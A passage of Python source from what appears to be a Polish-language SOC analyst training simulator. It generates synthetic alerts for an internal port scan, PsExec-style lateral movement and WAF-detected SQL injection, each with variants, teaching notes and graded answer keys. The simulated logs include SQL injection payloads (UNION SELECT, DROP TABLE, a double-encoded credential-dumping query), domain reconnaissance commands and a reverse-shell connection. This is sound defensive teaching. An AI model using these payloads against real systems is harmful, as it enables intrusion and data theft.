                "Po skanie próby logowania na lokalnym koncie administrator na wykrytych serwerach. Skan był rozpoznaniem przed atakiem.")
        noise(b, profile="night", involved=[p])
        truth = b.truth(
            "tp", "high",
            f"Stacja {p.host} skanuje całą sieć (211 hostów, porty administracyjne) narzędziem {'ipscan.exe z Temp' if not b.hard else 'pętlą PowerShell'}, a zaraz potem próbuje logować się na serwery kontem administrator.",
            f"TP. {p.host} ({p.sam}) w nocy: skan 211 hostów, porty 22/445/3389/5985, narzędzie {'ipscan.exe (niepodpisany, Temp)' if not b.hard else 'Test-NetConnection w pętli'}, "
            "potem 4625 dla administrator na SRV-FILE01 i SRV-SQL01. Brak zmiany. Eskaluję, wnoszę o izolację hosta.",
            required=["isolate_host"], lookups=[f"asset:{p.host}"])
        host_for_desc = p.host
    elif variant == "btp":
        b.at_hour(22, weekday=True)
        b.server("SRV-SCAN01", Uwagi="Cotygodniowe skanowanie podatności całej sieci, niedziela–piątek 22:00–02:00")
        trigger = None
        base = rng.randint(10, 60)
        for i in range(14):
            trigger = b.add(src.fw(b.t(-3 + i * 0.2), "allow", "tcp", "10.10.30.9", rng.randint(40000, 60000), f"10.10.{base}.{i + 2}", [21, 22, 80, 135, 443, 445, 3389][i % 7],
                                   rule="Scanner-to-all", app="vuln-scan", host=""))
            if i == 0:
                trigger.key("Aggregated: 36 200 prób do 1 840 hostów, kolejne adresy rosnąco, szeroki zestaw portów 1–1000, ze znanego serwera skanera.")
        trigger.summary = "[AGG] 36 200 połączeń, 1 840 hostów, porty 1–1000 w 4 godz. z SRV-SCAN01"
        b.change("srv-scan01", b.t(-30), b.t(240), "Cotygodniowy skan podatności (okno 22:00–02:00, cały zakres 10.10.0.0/16)", "CHG-STD-012")
        noise(b, profile="office", involved=[])
        truth = b.truth(
            "btp", "info",
            "Skanowanie pochodzi z SRV-SCAN01, serwera skanera podatności, w oknie zaplanowanym w CHG-STD-012. Wzorzec skanu jest uporządkowany (kolejne adresy, szeroki zakres portów).",
            "BTP. SRV-SCAN01 skanuje 10.10.0.0/16 (kolejne adresy, porty 1–1000). Ewidencja: skaner podatności, zmiana standardowa CHG-STD-012 22:00–02:00 obejmuje czas alertu. "
            "Skan zgodny z planem. Zamykam, nie izoluję.",
            lookups=["asset:SRV-SCAN01", "change:srv-scan01"], harmful=["block_ioc"])
        host_for_desc = "SRV-SCAN01"
    else:
        b.at_hour(rng.choice([9, 10, 14]), weekday=True)
        b.server("SRV-MON01")
        trigger = None
        for cycle in (-10, -5, 0):
            for i, port in enumerate([161, 443, 80]):
                trigger = b.add(src.fw(b.t(cycle, i * 2), "allow", "udp" if port == 161 else "tcp", "10.10.30.15", rng.randint(40000, 60000),
                                       rng.choice(targets), port, bytes_out=rng.randint(80, 400), bytes_in=rng.randint(200, 2000), rule="Monitoring", app="snmp/http", host=""))
                if cycle == -10 and i == 0:
                    trigger.key("Poprzedni cykl 10 minut wcześniej: identyczny wzorzec co 5 minut.")
        trigger.summary = "[AGG] 380 połączeń, 120 hostów, porty 161/80/443 co 5 min z SRV-MON01"
        trigger.herring("Setki hostów w krótkim czasie wygląda jak skan, ale to wąski zestaw portów i regularny cykl co 5 minut.")
        noise(b, involved=[])
        truth = b.truth(
            "fp", "low",
            "Źródłem jest SRV-MON01 (Zabbix): cyklicznie co 5 minut odpytuje ~120 hostów po SNMP i HTTP(S). Wzorzec jest wąski i regularny, to normalna praca monitoringu.",
            "FP. SRV-MON01 co 5 min łączy się z ~120 hostami na portach 161/80/443 (SNMP/HTTP). Ewidencja: Monitoring (Zabbix) ICMP/SNMP/HTTP co 5 minut. Cykle widoczne także wcześniej. "
            "Zamykam jako FP, wnoszę o wyjątek dla SRV-MON01 w regule skanowania.",
            lookups=["asset:SRV-MON01"], harmful=["block_ioc"])
        host_for_desc = "SRV-MON01"
    b.finish(trigger, source="SIEM", rule="Internal port scan", severity="high",
             description=f"Host {host_for_desc} połączył się z setkami hostów wewnętrznych w krótkim czasie.", truth=truth, lessons=LESSONS_SCAN)


# ======================================================================================================================
# PsExec-like lateral movement
# ======================================================================================================================
LESSONS_PSEXEC = Lessons(
    title="Zdalna usługa przez ADMIN$ (PsExec)",
    category="Sieć",
    tp_signs=[
        "Źródłem jest stacja robocza użytkownika, a konto administracyjne normalnie loguje się tylko z serwera skokowego.",
        "Nazwa usługi losowa (8 znaków), plik w katalogu Windows wgrany przez ADMIN$ chwilę wcześniej.",
        "Proces potomny wykonuje rozpoznanie: whoami /all, net group „Domain Admins”.",
        "Brak zmiany w kalendarzu, godzina nocna.",
    ],
    fp_signs=[
        "Źródłem jest system zarządzania (SRV-SCCM01, konto maszynowe), usługa o znanej nazwie (ccmsetup).",
        "Zmiana w kalendarzu obejmuje cel i okno czasowe.",
        "Administrator łączy się z JUMP01 w oknie serwisowym, używa oryginalnego PsExec (PSEXESVC, podpis Microsoft).",
    ],
    checklist=[
        "Skąd połączenie (IP/host źródłowy) i jaka jest jego rola?",
        "Kto: konto administracyjne czy maszynowe? Czy konto zwykle loguje się z tego miejsca?",
        "Nazwa i ścieżka usługi, kto ją wgrał.",
        "Co uruchomiła usługa (procesy potomne, Sysmon 1)?",
        "Zmiana / okno serwisowe / ticket.",
        "Czy konto było wcześniej narażone (np. zrzut LSASS)?",
    ],
    pitfalls=[
        "PsExec jest też narzędziem administratorów. Liczy się skąd, kto i czy zgadza się z planem.",
        "Nie oceniaj po samej nazwie PSEXESVC: atakujący używają losowych nazw, by uniknąć sygnatur.",
    ],
    attack=["T1021.002 SMB/Windows Admin Shares", "T1569.002 Service Execution", "T1078 Valid Accounts"],
    tips=[
        "Windows System 7045 / Security 4697: nazwa usługi, ImagePath, konto. Korelacja z 5140 (ADMIN$) i 4624 typ 3.",
        "AD: sprawdź, z jakich hostów dane konto administracyjne loguje się zwykle (Kontekst → Użytkownik).",
        "Sysmon 1 na celu: rodzic = plik usługi, potomek = polecenia atakującego.",
    ],
    hints=[
        "Skąd przyszło połączenie i czy to konto normalnie tak pracuje?",
        "Zobacz nazwę i ścieżkę usługi oraz co ona uruchomiła.",
        "Sprawdź Kontekst: użytkownik administracyjny i kalendarz zmian dla celu.",
    ],
)


@template("lateral_psexec", ("tp", "btp", "fp"), LESSONS_PSEXEC)
def lateral_psexec(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    target = "SRV-FILE01"
    b.server(target)
    ap = w.person("IT")
    adm = b.admin("adm_" + ap.sam, ap.display, **{"Typowe stanowiska logowania": "wyłącznie JUMP01"})
    if variant == "tp":
        b.at_hour(rng.choice([2, 3, 4]), weekday=True)
        p = b.person(rng.choice(["Logistyka", "Sprzedaż"]))
        src_ip, src_host, account = p.ip, p.host, adm
        svc = "".join(rng.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8))
        b.add(src.logon_ok(b.t(-1), target, account, src_ip, 3, workstation=src_host)).key(
            f"Konto administracyjne {account} loguje się na serwer plików ze STACJI ROBOCZEJ {src_host}, a normalnie loguje się tylko z JUMP01.")
        b.add(src.winsec(b.t(-0.5), target, 5140, "A network share object was accessed", {"SubjectUserName": account, "ShareName": r"\\*\ADMIN$",
                                                                                     "IpAddress": src_ip}, rf"Dostęp do udziału ADMIN$ z {src_ip} ({account})", account)).key(
            "Dostęp do ADMIN$ jest typowy dla PsExec: wgranie pliku usługi do katalogu Windows.")
        trigger = b.add(src.winsec(b.t(0), target, 7045, "A service was installed in the system", {
            "ServiceName": svc, "ImagePath": rf"%SystemRoot%\{svc}.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem"},
            f"Zainstalowano usługę {svc} (%SystemRoot%\\{svc}.exe)", account))
        trigger.key(f"Usługa o losowej nazwie „{svc}” zainstalowana zdalnie jako LocalSystem. Nie jest to PSEXESVC ani żaden znany produkt.")
        svc_proc = Proc(w.pid(), rf"C:\Windows\{svc}.exe", rf"C:\Windows\{svc}.exe")
        b.spawn(svc_proc, CMD, r'cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__out 2>&1', b.t(0, 8), target, SYSTEM)
        b.events[-1].key("Usługa uruchamia cmd.exe wykonujące rozpoznanie (whoami /all). To interaktywny shell atakującego.")
        b.spawn(svc_proc, CMD, r'cmd.exe /Q /c net group "Domain Admins" /domain', b.t(0, 40), target, SYSTEM)
        b.events[-1].key("Wyliczanie administratorów domeny: kolejny krok rozpoznania.")
        noise(b, profile="night", involved=[p])
        truth = b.truth(
            "tp", "critical",
            f"Konto {account} (normalnie tylko z JUMP01) zalogowało się na SRV-FILE01 ze stacji {src_host}, wgrało plik przez ADMIN$ i uruchomiło usługę „{svc}”, która wykonuje rozpoznanie domeny.",
            f"TP, krytyczne. SRV-FILE01: 4624 typ 3 konta {account} z {src_host} ({src_ip}), ADMIN$, usługa {svc} (LocalSystem), potem whoami /all i net group \"Domain Admins\". "
            f"Konto {account} nie powinno logować się ze stacji roboczej: poświadczenia skradzione. Eskaluję natychmiast, izolacja {src_host}, reset {account}.",
            required=["isolate_host", "reset_creds", "hunt_org"], lookups=[f"user:{account}"])
    elif variant == "btp":
        b.at_hour(rng.choice([22, 23]), weekday=True)
        b.server("JUMP01")
        account = adm
        b.add(src.logon_ok(b.t(-2), target, account, "10.10.40.5", 3, workstation="JUMP01")).key(
            f"Konto {account} loguje się z JUMP01: właściwe, zgodne z procedurą miejsce pracy administratora.")
        b.add(src.winsec(b.t(-1), target, 5140, "A network share object was accessed", {"SubjectUserName": account, "ShareName": r"\\*\ADMIN$",
                                                                                   "IpAddress": "10.10.40.5"}, rf"Dostęp do udziału ADMIN$ z 10.10.40.5 ({account})", account))
        trigger = b.add(src.winsec(b.t(0), target, 7045, "A service was installed in the system", {
            "ServiceName": "PSEXESVC", "ImagePath": r"%SystemRoot%\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem"},
            "Zainstalowano usługę PSEXESVC (%SystemRoot%\\PSEXESVC.exe)", account))
        trigger.herring("PSEXESVC to klasyczny ślad PsExec, ale tu jest oryginalna nazwa, z JUMP01, od administratora, w oknie serwisowym.")
        svc_proc = Proc(w.pid(), r"C:\Windows\PSEXESVC.exe", "PSEXESVC.exe")
        b.spawn(svc_proc, CMD, r"cmd.exe /c C:\Scripts\patch_kb5034439.cmd", b.t(0, 6), target, SYSTEM)
        b.events[-1].key("Usługa uruchamia znany skrypt patchujący z katalogu C:\\Scripts, nie polecenia rozpoznania.")
        b.change("srv-file01", b.t(-60), b.t(60), f"Okno serwisowe: instalacja poprawek na SRV-FILE01. Wykonawca: {account}", "CHG-1121")
        noise(b, profile="night", involved=[])
        truth = b.truth(
            "btp", "info",
            f"PsExec z JUMP01 konta {account} do instalacji poprawek na SRV-FILE01 w oknie CHG-1121. Detekcja jest zasadna, aktywność autoryzowana.",
            f"BTP. SRV-FILE01: usługa PSEXESVC zainstalowana przez {account} z JUMP01 (jego typowe miejsce pracy), uruchomiła C:\\Scripts\\patch_kb5034439.cmd. CHG-1121 obejmuje serwer i okno. Zamykam.",
            lookups=["change:srv-file01", f"user:{account}"])
    else:
        b.at_hour(rng.choice([2, 3]), weekday=True)
        b.server("SRV-SCCM01")
        account = "SRV-SCCM01$"
        b.add(src.logon_ok(b.t(-1), target, account, "10.10.30.4", 3, workstation="SRV-SCCM01")).key(
            "Logowanie konta maszynowego SRV-SCCM01$: system zarządzania, nie człowiek.")
        trigger = b.add(src.winsec(b.t(0), target, 7045, "A service was installed in the system", {
            "ServiceName": "ccmsetup", "ImagePath": r"C:\Windows\ccmsetup\ccmsetup.exe /runservice /config:MobileClient.tcf", "ServiceType": "user mode service",
            "StartType": "auto start", "AccountName": "LocalSystem"}, "Zainstalowano usługę ccmsetup", account))
        trigger.herring("Zdalna instalacja usługi jako LocalSystem wygląda jak ruch boczny, ale to klient SCCM instalowany przez serwer SCCM.")
        sc = Proc(w.pid(), r"C:\Windows\ccmsetup\ccmsetup.exe", "ccmsetup.exe /runservice")
        b.spawn(sc, r"C:\Windows\ccmsetup\ccmsetup.exe", r"ccmsetup.exe /runservice /config:MobileClient.tcf", b.t(0, 5), target, SYSTEM, signer="Microsoft Corporation")
        b.events[-1].key("Nazwa usługi i obraz zgodne ze standardowym klientem SCCM (podpisany Microsoft).")
        b.change("*", b.t(-120), b.t(180), "Wdrożenie klienta SCCM na serwerach (client push)", "CHG-1094")
        noise(b, profile="night", involved=[])
        truth = b.truth(
            "fp", "info",
            "Usługę ccmsetup instaluje serwer SCCM kontem maszynowym w ramach client push (CHG-1094). Nazwa i ścieżka zgodne z produktem.",
            "FP. SRV-FILE01: usługa ccmsetup zainstalowana zdalnie przez SRV-SCCM01$ (konto maszynowe), ccmsetup.exe podpisany Microsoft, zmiana CHG-1094 (client push). Zamykam jako FP.",
            lookups=["change:srv-file01"])
    b.finish(trigger, source="SIEM", rule="Remote service installed via admin share (PsExec-like)", severity="high",
             description=f"Na {target} zdalnie zainstalowano usługę przez ADMIN$.", truth=truth, lessons=LESSONS_PSEXEC)


# ======================================================================================================================
# WAF: SQL injection
# ======================================================================================================================
LESSONS_WAF = Lessons(
    title="WAF: próby SQL injection",
    category="Sieć",
    tp_signs=[
        "Zewnętrzny adres, wiele różnych payloadów w serii, narzędzie w User-Agent (sqlmap) lub losowe wzorce.",
        "Jeśli któreś żądanie przechodzi (200, duża odpowiedź), a po nim pojawia się upload lub nowa strona na serwerze: włamanie, nie tylko próba.",
        "Po próbach nowe połączenia wychodzące z serwera WWW.",
    ],
    fp_signs=[
        "Pojedyncze żądanie z uwierzytelnionej sesji wewnętrznej, treść to legalny fragment SQL (wiki/zgłoszenie).",
        "Skaner podatności z zatwierdzonym IP w oknie z kalendarza (BTP).",
        "Brak serii i brak sukcesu dla payloadów.",
    ],
    checklist=[
        "Źródło: zewnętrzne/wewnętrzne, uwierzytelnione?",
        "Liczba i różnorodność payloadów, User-Agent.",
        "Statusy odpowiedzi: wszystkie zablokowane czy któreś przeszło (200 i duży rozmiar)?",
        "Co działo się po: upload, nowe pliki, połączenia wychodzące z serwera.",
        "Kalendarz skanów i zatwierdzone IP.",
    ],
    pitfalls=[
        "„Zablokowane” kończy sprawę tylko wtedy, gdy WSZYSTKIE próby zablokowano. Szukaj tych, które przeszły.",
        "Treść, która wygląda jak SQL, nie zawsze jest atakiem: wiki, zgłoszenia i fora techniczne.",
    ],
    attack=["T1190 Exploit Public-Facing Application", "T1505.003 Web Shell"],
    tips=[
        "WAF: filtruj po src, grupuj po rule id i statusie; szukaj 200 z dużym rozmiarem odpowiedzi.",
        "Po podejrzeniu przejścia: sprawdź SRV-WEB01 pod kątem nowych plików .aspx w katalogach uploadu.",
        "ESET Server Security: skan katalogów aplikacji WWW na obecność webshelli.",
    ],
    hints=[
        "Skąd pochodzi ruch i jak wygląda seria żądań?",
        "Czy któreś żądanie zakończyło się sukcesem i co potem robił serwer?",
        "Sprawdź Kontekst: czy źródło to zatwierdzony skaner albo użytkownik wewnętrzny.",
    ],
)


@template("web_attack", ("tp", "btp", "fp"), LESSONS_WAF)
def web_attack(b: Builder, variant: str) -> None:
    w, rng = b.w, b.rng
    b.server("SRV-WEB01", Uwagi="Portal klienta w DMZ, dostępny z internetu. Aplikacja ASP.NET, baza SRV-SQL01.")
    payloads = ["/products?id=1' OR '1'='1", "/products?id=1 UNION SELECT NULL,@@version--", "/search?q=';WAITFOR DELAY '0:0:5'--",
                "/products?id=1; DROP TABLE users--", "/login?user=admin'--", "/products?id=1' AND 1=CONVERT(int,(SELECT @@version))--"]
    if variant == "tp":
        b.at_hour(rng.choice([3, 4, 13, 20]), weekday=False)
        ip = w.attacker_ip()
        ua = "sqlmap/1.7.11#stable (https://sqlmap.org)"
        trigger = None
        for i in range(18):
            trigger = b.add(src.waf(b.t(-6 + i * 0.3), ip, "GET", payloads[i % len(payloads)], 403, "942100 SQL Injection Attack Detected", "blocked", 220, ua=ua))
            if i < 2:
                trigger.key("Seria różnych payloadów SQLi z jednego zewnętrznego IP, User-Agent sqlmap. Zablokowane przez WAF.")
        if b.hard:
            b.add(src.waf(b.t(-0.5), ip, "GET", "/products?id=1%2527%20UNION%20SELECT%20username,password%20FROM%20users--", 200, "-", "passed", 1_940_000, ua=ua)).key(
                "To samo IP, ale payload w podwójnym kodowaniu (%2527) PRZESZEDŁ: status 200 i 1,9 MB odpowiedzi. Dane z bazy wyciekły.")
            b.add(src.waf(b.t(1), ip, "POST", "/uploads/avatar.aspx", 200, "-", "passed", 3_200, ua="Mozilla/5.0")).key(
                "Wysłanie pliku .aspx przez upload: webshell.")
            b.add(src.fw(b.t(3), "allow", "tcp", "172.16.5.20", 49812, ip, 4444, bytes_out=18_000, bytes_in=2_500, rule="DMZ-to-Internet", app="unknown", host="SRV-WEB01")).key(
                "Serwer WWW nawiązuje połączenie WYCHODZĄCE do atakującego (port 4444): reverse shell.")
        b.ti_bad(ip, "IP", age_days=30, tags="scanner, sqlmap")
        noise(b, involved=[])
        truth = b.truth(
            "tp", "high" if b.hard else "low",
            ("Seria ataków SQL injection z zewnętrznego IP. " + ("Jeden payload przeszedł WAF, zwrócił 1,9 MB danych, potem webshell i reverse shell z serwera: SRV-WEB01 jest skompromitowany." if b.hard
                                                                else "Wszystkie żądania zablokowane przez WAF (403), więc bez skutku, ale ruch jest złośliwy.")),
            f"TP. {ip}: 18 żądań SQLi (sqlmap) na SRV-WEB01. " + ("Jedno żądanie przeszło (200, 1,9 MB), potem upload .aspx i połączenie wychodzące :4444. Eskaluję pilnie, izolacja SRV-WEB01." if b.hard
                                                                  else "Wszystkie 403/blocked. Brak sukcesu. Blokuję IP, bez eskalacji."),
            required=["isolate_host", "block_ioc", "reset_creds"] if b.hard else ["block_ioc"], drop=() if b.hard else ("escalate_l2",),
            allow=() if b.hard else ("close", "close_tune"), lookups=[f"ti:{ip}"])
    elif variant == "btp":
        b.at_hour(22, weekday=True)
        ua = "VulnScanner/10.4 (credentialed web audit)"
        trigger = None
        for i in range(18):
            trigger = b.add(src.waf(b.t(-6 + i * 0.3), "10.10.30.9", "GET", payloads[i % len(payloads)], 403, "942100 SQL Injection Attack Detected", "blocked", 220, ua=ua))
            if i < 2:
                trigger.key("Seria payloadów z wewnętrznego IP 10.10.30.9 (SRV-SCAN01), User-Agent skanera podatności.")
        b.server("SRV-SCAN01", Uwagi="Skaner podatności. Cotygodniowy skan SRV-WEB01 (okno 21:30–23:30).")
        b.change("srv-web01", b.t(-30), b.t(120), "Cotygodniowy skan podatności aplikacji portalu klienta (źródło SRV-SCAN01, 10.10.30.9)", "CHG-STD-012")
        noise(b, involved=[])
        truth = b.truth(
            "btp", "info",
            "Payloady pochodzą ze skanera podatności SRV-SCAN01 w zaplanowanym oknie (CHG-STD-012) i zostały zablokowane. Detekcja zasadna, ruch autoryzowany.",
            "BTP. 18 żądań SQLi na SRV-WEB01 z 10.10.30.9 (SRV-SCAN01), UA VulnScanner/10.4, wszystkie 403. CHG-STD-012: skan SRV-WEB01 w tym oknie. Zamykam bez eskalacji.",
            lookups=["change:srv-web01", "asset:SRV-SCAN01"], harmful=["block_ioc"])
    else:
        b.at_hour(rng.choice([10, 11, 14]), weekday=True)
        dba = b.person("IT")
        trigger = b.add(src.waf(b.t(0), dba.ip, "POST", "/wiki/save", 403, "942100 SQL Injection Attack Detected", "blocked", 220,
                                ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0", user=dba.sam))
        trigger.herring("Reguła SQLi zadziałała na treść wpisu wiki zawierającą „SELECT * FROM”. Wygląda jak payload, ale to dokumentacja.")
        b.add(src.waf(b.t(-0.2), dba.ip, "GET", "/wiki/edit/baza-sql", 200, "-", "passed", 14_300, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0", user=dba.sam)).key(
            "Wcześniej uwierzytelniony użytkownik IT otworzył edycję strony wiki. To zwykła praca.")
        b.add(src.waf(b.t(0.6), dba.ip, "POST", "/wiki/save", 200, "-", "passed", 1_200, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0", user=dba.sam)).key(
            "Po chwili ten sam zapis przechodzi (prawdopodobnie bez bloku kodu). Brak serii i brak eskalacji payloadów.")
        noise(b, involved=[dba])
        truth = b.truth(
            "fp", "low",
            f"{dba.sam} (IT) zapisywał stronę wiki z fragmentem zapytania SQL. WAF zablokował pojedyncze żądanie regułą 942100. To jedno żądanie, wewnętrzne, z uwierzytelnionej sesji.",
            f"FP. 1 żądanie POST /wiki/save zablokowane przez 942100 z {dba.ip} ({dba.sam}, IT), uwierzytelniona sesja, treść = dokumentacja SQL. Następnie zapis przeszedł. "
            "Zamykam jako FP, wnoszę o wyjątek WAF dla /wiki/save.",
            lookups=[f"user:{dba.sam}"])
    b.finish(trigger, source="WAF", rule="WAF: SQL Injection attempt", severity="medium",
             description=f"WAF zablokował żądanie z {trigger.fields['SourceIp']} do {trigger.fields['Uri'].split('?')[0]}.", truth=truth, lessons=LESSONS_WAF)

